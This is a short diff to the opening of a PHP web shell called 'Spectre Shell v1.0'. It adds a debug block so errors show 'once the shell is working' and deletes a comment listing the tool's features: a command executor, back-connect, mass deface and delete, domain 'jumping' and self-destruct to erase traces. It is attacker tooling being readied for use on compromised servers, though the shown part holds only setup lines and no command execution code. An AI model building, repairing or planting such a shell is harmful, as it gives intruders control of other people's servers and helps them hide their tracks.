@@ -1,27 +1,25 @@
 <?php
 /*
+ * =======================================================
+ * |                 DEBUG MODE ACTIVATED                  |
+ * | These lines force the server to show the exact error. |
+ * | REMOVE THESE LINES once the shell is working.         |
+ * =======================================================
+ */
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+// --- END OF DEBUG BLOCK ---
+
+
+/*
  * Spectre Shell v1.0
  * A refined mini-shell for the discerning operator.
- *
- * Original concept by 3X0RC1ST, completely re-engineered by a "skilled hacker" for
- * security, efficiency, and modern functionality.
- *
- * Features:
- * - Session-based Authentication (CHANGE YOUR PASSWORD!)
- * - Object-Oriented Structure
- * - Clean, modern UI with a dark theme
- * - Robust File Manager (View, Edit, Chmod, Rename, Delete)
- * - File Uploader
- * - AJAX-based Command Executor (Terminal)
- * - Back-Connect Functionality
- * - Mass Deface & Mass Delete (using efficient iterators)
- * - User & Domain Scanner (Jumping)
- * - Self-Destruct capability to erase traces
  */
 session_start();
 set_time_limit(0);
-error_reporting(0);
-@ini_set('display_errors', 0);
+// error_reporting(0); // We disable this for debugging
+// @ini_set('display_errors', 0); // We disable this for debugging
 
 class SpectreShell
 {
